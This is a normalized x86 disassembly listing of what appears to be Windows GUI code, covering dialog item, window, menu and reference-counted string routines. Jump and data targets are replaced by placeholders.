push r--data
push eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x18 ] 0x6
call sub_441166
test eax eax
je r-xdata
or esi 0x4
test [ ebp + 0x8 ] 0x40
je r-xdata
lea eax [ ebp - 0xc ]
push 0x3fc0
push eax
mov [ ebp - 0x8 ] 0xff
call sub_4411a7
or esi eax
and [ ebp + 0x8 ] 0xc03f
or esi ebx
test [ ebp + 0x8 ] 0x80
je r-xdata
lea eax [ ebp - 0xc ]
push 0x40
push eax
mov [ ebp - 0x8 ] 0x10
call sub_4411a7
or esi eax
mov eax 0x100
test [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0xc ]
push 0x80
push eax
mov [ ebp - 0x8 ] 0x2
call sub_4411a7
or esi eax
mov eax 0x200
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] ebx
call sub_4411a7
or esi eax
mov ebx 0x400
test [ ebp + 0x8 ] ebx
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x20
call sub_4411a7
or esi eax
mov edi 0x800
test [ ebp + 0x8 ] edi
je r-xdata
lea eax [ ebp - 0xc ]
push ebx
push eax
mov [ ebp - 0x8 ] 0x1
call sub_4411a7
or esi eax
mov eax 0x1000
test [ ebp + 0x8 ] eax
je r-xdata
lea eax [ ebp - 0xc ]
push edi
push eax
mov [ ebp - 0x8 ] 0x40
call sub_4411a7
or esi eax
mov eax 0x2000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x4
call sub_4411a7
or esi eax
mov eax 0x4000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x80
call sub_4411a7
or esi eax
mov eax 0x8000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] edi
call sub_4411a7
or esi eax
mov eax 0x10000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] ebx
call sub_4411a7
or esi eax
mov eax 0x20000
test [ ebp + 0x8 ] eax
je r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x200
call sub_4411a7
or esi eax
mov ecx [ ebp - 0x4 ]
mov edx 0x3fc0
or [ ecx + 0x18 ] esi
mov eax [ ecx + 0x18 ]
mov edi eax
and edi edx
cmp edi edx
jne r-xdata
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] 0x100
call sub_4411a7
or esi eax
mov eax esi
pop edi
and eax [ ebp + 0x8 ]
pop esi
pop ebx
sub eax [ ebp + 0x8 ]
neg eax
sbb eax eax
inc eax
or al 0x10
or esi 0x10
mov [ ecx + 0x18 ] eax
sub_4414f4
push esi
mov esi ecx
push [ esp + 0x8 ]
call sub_43e7f8
test eax eax
je r-xdata
pop esi
retn 0x4
mov eax [ esi ]
mov ecx esi
call [ eax + 0x50 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x80 ]
mov esi eax
call sub_43e8aa
push eax
push 0xfffffffc
push [ esp + 0x10 ]
call [ SetWindowLongA@IAT ]
cmp [ esi ] 0x0
jne r-xdata
push 0x1
pop eax
mov [ esi ] eax
sub_441537
push esi
mov esi ecx
push edi
mov eax [ esi ]
call [ eax + 0x80 ]
mov edi eax
push [ edi ]
push 0xfffffffc
push [ esi + 0x1c ]
call [ SetWindowLongA@IAT ]
and [ edi ] 0x0
mov ecx esi
call sub_43e831
pop edi
pop esi
retn
sub_441585
mov eax [ ecx + 0x34 ]
test eax eax
jne r-xdata
mov edx [ eax ]
push [ esp + 0x4 ]
mov ecx eax
call [ edx + 0x70 ]
push [ esp + 0x4 ]
push [ ecx + 0x1c ]
call [ GetDlgItem@IAT ]
push eax
call sub_43e7b3
jmp r-xdata
retn 0x4
sub_4415af
mov eax [ ecx + 0x34 ]
test eax eax
jne r-xdata
push [ esp + 0x8 ]
mov edx [ eax ]
mov ecx eax
push [ esp + 0x8 ]
call [ edx + 0x6c ]
push [ esp + 0x4 ]
push [ ecx + 0x1c ]
call [ GetDlgItem@IAT ]
mov ecx [ esp + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
retn 0x8
sub_4415dd
mov eax [ ecx + 0x34 ]
test eax eax
jne r-xdata
push [ esp + 0x8 ]
mov edx [ eax ]
mov ecx eax
push [ esp + 0x8 ]
call [ edx + 0x84 ]
push [ esp + 0x8 ]
push [ esp + 0x8 ]
push [ ecx + 0x1c ]
call [ SetDlgItemTextA@IAT ]
jmp r-xdata
retn 0x8
sub_44160c
push esi
mov esi ecx
test [ esi + 0x25 ] 0x1
je r-xdata
push [ esp + 0x8 ]
push [ esi + 0x1c ]
call [ IsDialogMessageA@IAT ]
call sub_45357b
mov eax [ eax + 0x1038 ]
push [ esp + 0x8 ]
mov ecx eax
mov edx [ eax ]
push esi
call [ edx + 0x24 ]
jmp r-xdata
pop esi
retn 0x4
sub_441673
push ebp
mov ebp esp
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ edx + 0x78 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x1c ]
call sub_43e441
jmp r-xdata
pop ebp
retn 0xc
sub_4416a4
push ebp
mov ebp esp
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
push [ ebp + 0x10 ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ edx + 0x7c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x1c ]
call sub_43e45b
jmp r-xdata
pop ebp
retn 0xc
sub_4416fc
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
push [ esp + 0x8 ]
mov edx [ eax ]
mov ecx eax
push [ esp + 0x8 ]
call [ edx + 0x84 ]
push [ esp + 0x8 ]
push [ esp + 0x8 ]
push [ ecx + 0x1c ]
call [ GetWindowTextA@IAT ]
jmp r-xdata
retn 0x8
sub_441746
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
mov edx [ eax ]
push [ esp + 0x4 ]
mov ecx eax
call [ edx + 0x94 ]
push [ esp + 0x4 ]
push 0xfffffff4
push [ ecx + 0x1c ]
call [ SetWindowLongA@IAT ]
jmp r-xdata
retn 0x4
sub_44176f
push ebp
mov ebp esp
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
push [ ebp + 0x18 ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ edx + 0x98 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x1c ]
call [ MoveWindow@IAT ]
jmp r-xdata
pop ebp
retn 0x14
sub_4417b0
push ebp
mov ebp esp
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
push [ ebp + 0x1c ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ edx + 0x9c ]
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ecx + 0x1c ]
call [ SetWindowPos@IAT ]
jmp r-xdata
mov eax [ eax + 0x1c ]
pop ebp
retn 0x18
sub_441889
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
test ecx ecx
je r-xdata
pop ebp
retn
lea edx [ ebp + 0x20 ]
mov eax [ ecx ]
push edx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ eax + 0x58 ]
sub_4418d2
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn 0x4
cmp [ esi + 0x38 ] 0x0
jne r-xdata
push [ esi + 0x1c ]
call [ GetParent@IAT ]
push eax
mov eax [ esp + 0xc ]
lea ecx [ eax + 0x4 ]
call sub_43d531
test eax eax
je r-xdata
mov eax [ eax + 0x34 ]
test eax eax
je r-xdata
mov edx [ eax ]
push esi
mov ecx eax
call [ edx + 0x8c ]
sub_44192e
push esi
mov esi [ esp + 0x8 ]
add ecx 0x20
push [ esi + 0x1c ]
call sub_43d531
test eax eax
je r-xdata
pop esi
retn 0x4
mov ecx [ eax + 0x24 ]
test ecx ecx
je r-xdata
mov [ esi + 0x38 ] eax
mov [ eax + 0x24 ] esi
cmp [ ecx + 0x38 ] eax
jne r-xdata
and [ ecx + 0x38 ] 0x0
sub_441976
mov eax sub_4631f0
call sub_42dc88
push ecx
mov [ ebp - 0x10 ] ecx
mov eax [ ecx + 0x10 ]
and [ ebp - 0x4 ] 0x0
add ecx 0x10
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
call [ eax + 0x1c ]
sub_4419a1
push ebp
mov ebp esp
mov eax [ ebp + 0x20 ]
push ebx
push esi
push 0x1
test eax eax
pop ebx
je r-xdata
mov eax [ ebp + 0x1c ]
cmp eax 0x28
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
sub eax 0x29
je r-xdata
je r-xdata
mov eax ebx
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
push [ ebp + 0xc ]
call [ ebp + 0x14 ]
sub eax 0x3
je r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
push [ ebp + 0xc ]
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
dec eax
je r-xdata
mov esi [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push esi
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0xc ]
jmp r-xdata
sub eax 0xa
je r-xdata
xor ebx ebx
cmp [ esi + 0x1c ] ebx
sete bl
and [ esi + 0x1c ] 0x0
jmp r-xdata
push [ ebp + 0xc ]
mov esi [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push esi
call [ ebp + 0x14 ]
dec eax
je r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
je r-xdata
push [ ebp + 0x18 ]
dec eax
je r-xdata
mov ebx eax
push [ ebp + 0xc ]
jmp r-xdata
sub eax 0x16
je r-xdata
push [ ebp + 0x18 ]
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
sub eax 0x3
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x1c
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec eax
jne r-xdata
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
push [ eax ]
push [ eax + 0x4 ]
call [ ebp + 0x14 ]
jmp r-xdata
sub_441aa8
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
cmp eax 0xfffffffe
mov edi ecx
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
call sub_45357b
push [ ebp + 0x14 ]
mov eax [ eax + 0x1038 ]
mov ecx eax
push [ ebp + 0x10 ]
mov edx [ eax ]
push [ ebp + 0x8 ]
push edi
call [ edx + 0x4 ]
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebp + 0x10 ]
and [ ebp + 0xc ] 0x0
mov ecx edi
mov eax [ ebx + 0x30 ]
mov [ ebp + 0x10 ] eax
mov eax [ edi ]
call [ eax + 0x2c ]
mov edi eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov ebx 0x111
mov ebx eax
movzx eax ax
shr ebx 0x10
mov [ ebp + 0xc ] eax
jne r-xdata
mov eax [ ebp + 0xc ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
xor eax eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
push ebx
push [ esi + 0x4 ]
call sub_43f5d5
test eax eax
jne r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x28 ]
mov esi eax
mov esi [ edi + 0x4 ]
push [ ebp + 0x14 ]
push [ eax + 0x10 ]
push [ ebp + 0x10 ]
push [ eax + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push edi
call sub_4419a1
jmp r-xdata
mov esi [ esi ]
jmp r-xdata
mov edi [ edi ]
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
test esi esi
je r-xdata
test edi edi
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] eax
jne r-xdata
add esi 0xc
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
push 0x10
push eax
push [ ebp + 0x10 ]
call sub_42dcf0
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp + 0xc ] 0x1
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_441c07
push esi
mov esi ecx
push 0xd
call sub_45565c
mov eax [ esi ]
mov ecx esi
call [ eax + 0x20 ]
test eax eax
je r-xdata
push 0xd
call sub_4556cc
test esi esi
je r-xdata
mov ecx eax
call sub_4535b8
pop esi
retn
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x4 ]
sub_441c49
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x20 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x14 ] ecx
mov [ eax + 0x1c ] ecx
mov [ eax + 0x18 ] ecx
retn
sub_441c6f
push esi
mov esi ecx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ esp + 0x8 ] 0x0
push edi
jne r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
push [ esp + 0xc ]
mov ecx [ esi + 0x14 ]
call sub_441841
pop edi
mov edi [ esi + 0x14 ]
call [ GetFocus@IAT ]
cmp eax [ edi + 0x1c ]
jne r-xdata
pop esi
retn 0x4
mov ecx [ esp + 0x8 ]
neg ecx
sbb ecx ecx
and ecx 0xfffffffd
add ecx 0x3
or ch 0x4
push ecx
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ EnableMenuItem@IAT ]
jmp r-xdata
push [ edi + 0x1c ]
call [ GetParent@IAT ]
push eax
call sub_43e7b3
mov ecx [ esi + 0x14 ]
test ecx ecx
je r-xdata
mov [ esi + 0x18 ] 0x1
push 0x0
push ecx
push [ eax + 0x1c ]
call [ GetNextDlgTabItem@IAT ]
push eax
call sub_43e7b3
mov ecx eax
call sub_441868
mov ecx [ ecx + 0x1c ]
sub_441cff
push esi
mov esi ecx
push edi
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
mov edi [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0x87
push [ eax + 0x1c ]
call edi
test ah 0x20
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
pop edi
pop esi
retn 0x4
mov eax [ esi + 0x14 ]
push 0x0
push [ esp + 0x10 ]
push 0xf1
push [ eax + 0x1c ]
call edi
mov ecx [ esp + 0xc ]
neg ecx
sbb ecx ecx
and ecx 0x8
or ch 0x4
push ecx
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ CheckMenuItem@IAT ]
jmp r-xdata
sub_441d61
push esi
push edi
mov esi ecx
xor edi edi
xor ecx ecx
cmp [ esp + 0xc ] edi
mov eax [ esi ]
setne cl
push ecx
mov ecx esi
call [ eax + 0x4 ]
cmp [ esi + 0xc ] edi
je r-xdata
pop edi
pop esi
retn 0x4
cmp [ esi + 0x10 ] edi
jne r-xdata
cmp [ rw-data ] edi
jne r-xdata
push [ rw-data ]
mov eax [ esi + 0xc ]
push edi
push 0x400
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ SetMenuItemBitmaps@IAT ]
call sub_453148
cmp [ rw-data ] edi
je r-xdata
sub_441db7
push esi
mov esi ecx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
mov eax [ esi + 0x14 ]
push [ eax + 0x1c ]
call sub_447993
cmp [ esi + 0x10 ] 0x0
jne r-xdata
pop esi
retn 0x4
mov ecx [ esi + 0x8 ]
push edi
mov edi 0x400
push edi
push ecx
push [ eax + 0x4 ]
call [ GetMenuState@IAT ]
push [ esp + 0xc ]
and ax 0xf6fb
or eax edi
push [ esi + 0x4 ]
push eax
mov eax [ esi + 0xc ]
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ ModifyMenuA@IAT ]
pop edi
jmp r-xdata
sub_441e0e
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
push 0x1
pop eax
cmp ax 0xffff
je r-xdata
push edi
mov edi [ ebp + 0x8 ]
push ebx
mov [ esi + 0x18 ] ebx
mov edx [ edi ]
push esi
push 0xffffffff
push eax
mov ecx edi
call [ edx + 0xc ]
cmp [ ebp + 0xc ] ebx
mov [ ebp + 0x8 ] eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop edi
jmp r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
pop esi
pop ebx
leave
retn 0x8
mov eax [ edi ]
lea ecx [ ebp - 0x8 ]
push ecx
push esi
push ebx
mov ecx edi
push [ esi + 0x4 ]
mov [ ebp - 0x8 ] ebx
call [ eax + 0xc ]
mov edx [ esi ]
push eax
mov ecx esi
call [ edx ]
sub_441e89
push esi
push edi
mov edi [ esp + 0xc ]
mov eax esi
pop edi
pop esi
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
call eax
test eax eax
pop ecx
jne r-xdata
push edi
call sub_42dd9c
mov esi eax
pop ecx
test esi esi
jne r-xdata
sub_441ebd
push esi
mov esi ecx
mov ecx [ esp + 0x8 ]
mov eax [ ecx ]
cmp [ eax - 0xc ] 0x0
jl r-xdata
mov eax [ rw-data ]
mov [ esi ] eax
push [ ecx ]
mov ecx esi
call sub_4422d1
mov [ esi ] eax
add eax 0xfffffff4
push eax
call [ InterlockedIncrement@IAT ]
jmp r-xdata
mov eax esi
pop esi
retn 0x4
sub_441fb5
push ebx
push esi
mov esi [ esp + 0xc ]
mov ebx ecx
test esi esi
jne r-xdata
push edi
push 0x40
pop edi
cmp esi edi
jg r-xdata
mov eax [ rw-data ]
mov [ ebx ] eax
jmp r-xdata
mov edi 0x80
cmp esi edi
jg r-xdata
mov ecx rw-data
pop esi
pop ebx
retn 0x4
mov edi 0x100
cmp esi edi
jg r-xdata
mov ecx rw-data
jmp r-xdata
mov [ eax ] 0x1
and [ eax + esi + 0xc ] 0x0
mov [ eax + 0x4 ] esi
add eax 0xc
mov [ ebx ] eax
pop edi
mov edi 0x200
cmp esi edi
jg r-xdata
mov ecx rw-data
jmp r-xdata
call sub_426554
mov [ eax + 0x8 ] edi
jmp r-xdata
lea eax [ esi + 0xd ]
push eax
call sub_441e89
pop ecx
mov [ eax + 0x8 ] esi
mov ecx rw-data
jmp r-xdata
sub_442037
mov eax [ ecx + 0x8 ]
cmp eax 0x40
jne r-xdata
cmp eax 0x80
jne r-xdata
push ecx
mov ecx rw-data
cmp eax 0x100
jne r-xdata
push ecx
mov ecx rw-data
jmp r-xdata
cmp eax 0x200
push ecx
jne r-xdata
push ecx
mov ecx rw-data
jmp r-xdata
call sub_4265e3
retn
call sub_441eb2
pop ecx
retn
mov ecx rw-data
jmp r-xdata
sub_44207f
push esi
mov esi ecx
mov eax [ esi ]
lea ecx [ eax - 0xc ]
cmp ecx [ rw-data ]
je r-xdata
pop esi
retn
add eax 0xfffffff4
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov eax [ rw-data ]
mov [ esi ] eax
mov ecx [ esi ]
sub ecx 0xc
call sub_442037
sub_4420f1
push esi
push edi
mov edi ecx
mov esi [ edi ]
cmp [ esi - 0xc ] 0x1
jle r-xdata
pop edi
pop esi
retn
call sub_44207f
push [ esi - 0x8 ]
mov ecx edi
call sub_441fb5
mov eax [ esi - 0x8 ]
inc eax
push eax
push esi
push [ edi ]
call sub_42e2d0
add esp 0xc
sub_44211f
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
mov eax [ esi ]
cmp [ eax - 0xc ] 0x1
jg r-xdata
mov ecx esi
call sub_44207f
push edi
mov ecx esi
call sub_441fb5
cmp edi [ eax - 0x4 ]
jle r-xdata
pop edi
pop esi
retn 0x4
sub_442148
push esi
mov esi ecx
mov eax [ esi ]
lea ecx [ eax - 0xc ]
cmp ecx [ rw-data ]
je r-xdata
pop esi
retn
add eax 0xfffffff4
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx [ esi ]
sub ecx 0xc
call sub_442037
sub_442172
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0xc ]
push edi
add eax ebx
mov edi ecx
test eax eax
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push eax
mov ecx esi
call sub_441fb5
mov eax [ edi ]
push ebx
add eax [ ebp + 0x10 ]
push eax
push [ esi ]
call sub_42e2d0
add esp 0xc
pop esi
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov [ eax ] ecx
jmp r-xdata
pop edi
pop ebx
pop ebp
retn 0x10
sub_4421b6
mov eax [ rw-data ]
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
push edi
test ebx ebx
mov [ esi ] eax
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn 0x4
mov eax ebx
shr eax 0x10
test ax ax
jne r-xdata
push ebx
call [ lstrlenA@IAT ]
mov edi eax
test edi edi
je r-xdata
movzx eax bx
push eax
call sub_4437c6
jmp r-xdata
push edi
mov ecx esi
call sub_441fb5
push edi
push ebx
push [ esi ]
call sub_42e2d0
add esp 0xc
sub_442208
mov eax [ rw-data ]
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
mov [ esi ] eax
je r-xdata
xor eax eax
push ebx
call sub_42e686
pop ecx
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn 0x4
push edi
lea edi [ eax + eax ]
push edi
mov ecx esi
call sub_441fb5
inc edi
push edi
push ebx
push [ esi ]
call sub_4426a7
add esp 0xc
mov ecx esi
push 0xffffffff
call sub_4425c7
pop edi
test eax eax
je r-xdata
sub_442254
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
call sub_44211f
push edi
push [ esp + 0x14 ]
push [ esi ]
call sub_42e2d0
mov eax [ esi ]
add esp 0xc
mov [ eax - 0x8 ] edi
mov eax [ esi ]
and [ eax + edi ] 0x0
pop edi
pop esi
retn 0x8
sub_442281
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
mov ecx [ esi ]
mov eax [ edi ]
cmp ecx eax
je r-xdata
mov eax esi
pop edi
pop esi
retn 0x4
cmp [ ecx - 0xc ] 0x0
jge r-xdata
cmp [ eax - 0xc ] 0x0
jge r-xdata
add ecx 0xfffffff4
cmp ecx [ rw-data ]
jne r-xdata
mov ecx esi
call sub_44207f
mov eax [ edi ]
mov [ esi ] eax
add eax 0xfffffff4
push eax
call [ InterlockedIncrement@IAT ]
push eax
mov ecx esi
push [ eax - 0x8 ]
call sub_442254
jmp r-xdata
sub_4422d1
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
test edi edi
jne r-xdata
push edi
call [ lstrlenA@IAT ]
xor eax eax
jmp r-xdata
push edi
push eax
mov ecx esi
call sub_442254
mov eax esi
pop edi
pop esi
retn 0x4
sub_4422f8
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
test ebx ebx
mov esi ecx
je r-xdata
xor eax eax
push ebx
call sub_42e686
pop ecx
jmp r-xdata
lea edi [ eax + eax ]
mov ecx esi
push edi
call sub_44211f
inc edi
push edi
push ebx
push [ esi ]
call sub_4426a7
add esp 0xc
mov ecx esi
push 0xffffffff
call sub_4425c7
mov eax esi
pop edi
pop esi
pop ebx
retn 0x4
sub_442339
push ebx
mov ebx [ esp + 0x10 ]
push esi
push edi
mov edi [ esp + 0x10 ]
mov esi ecx
lea eax [ edi + ebx ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn 0x10
push eax
call sub_441fb5
push edi
push [ esp + 0x18 ]
push [ esi ]
call sub_42e2d0
mov eax [ esi ]
push ebx
push [ esp + 0x2c ]
add eax edi
push eax
call sub_42e2d0
add esp 0x18
sub_442377
mov eax sub_463577
call sub_42dc88
push ecx
push ecx
mov eax [ rw-data ]
and [ ebp - 0x14 ] 0x0
push esi
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push 0x1
mov eax [ eax ]
mov ecx [ ecx ]
pop esi
push eax
mov [ ebp - 0x4 ] esi
push [ eax - 0x8 ]
push ecx
push [ ecx - 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_442339
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_441ebd
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_442148
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
sub_4423dd
mov eax sub_4635a3
call sub_42dc88
push ecx
push ecx
mov eax [ rw-data ]
and [ ebp - 0x14 ] 0x0
push esi
mov [ ebp - 0x10 ] eax
cmp [ ebp + 0x10 ] 0x0
push 0x1
pop esi
mov [ ebp - 0x4 ] esi
jne r-xdata
push [ ebp + 0x10 ]
call [ lstrlenA@IAT ]
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
push [ ebp + 0x10 ]
mov ecx [ ecx ]
push eax
push ecx
push [ ecx - 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_442339
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_441ebd
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_442148
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
sub_442451
mov eax sub_4635cf
call sub_42dc88
push ecx
push ecx
mov eax [ rw-data ]
and [ ebp - 0x14 ] 0x0
push esi
mov [ ebp - 0x10 ] eax
cmp [ ebp + 0xc ] 0x0
push 0x1
pop esi
mov [ ebp - 0x4 ] esi
jne r-xdata
push [ ebp + 0xc ]
call [ lstrlenA@IAT ]
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov ecx [ ecx ]
push ecx
push [ ecx - 0x8 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_442339
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_441ebd
mov [ ebp - 0x14 ] esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_442148
mov ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0xc
sub_4424c5
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
test edi edi
mov esi ecx
je r-xdata
pop edi
pop esi
pop ebx
retn 0x8
mov eax [ esi ]
cmp [ eax - 0xc ] 0x1
lea ebx [ eax - 0xc ]
jg r-xdata
push [ esp + 0x14 ]
mov ecx esi
push edi
push eax
push [ eax - 0x8 ]
call sub_442339
push ebx
call sub_4420b0
mov ecx [ eax - 0x8 ]
lea edx [ ecx + edi ]
cmp edx [ eax - 0x4 ]
jg r-xdata
push edi
add ecx eax
push [ esp + 0x18 ]
push ecx
call sub_42e2d0
mov eax [ esi ]
add esp 0xc
add [ eax - 0x8 ] edi
mov eax [ esi ]
mov ecx [ eax - 0x8 ]
and [ ecx + eax ] 0x0
jmp r-xdata
sub_442524
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
test edi edi
jne r-xdata
push edi
call [ lstrlenA@IAT ]
xor eax eax
jmp r-xdata
push edi
push eax
mov ecx esi
call sub_4424c5
mov eax esi
pop edi
pop esi
retn 0x4
sub_442578
push ebx
push esi
mov esi ecx
mov ecx [ esp + 0xc ]
mov eax [ esi ]
cmp [ eax - 0xc ] 0x1
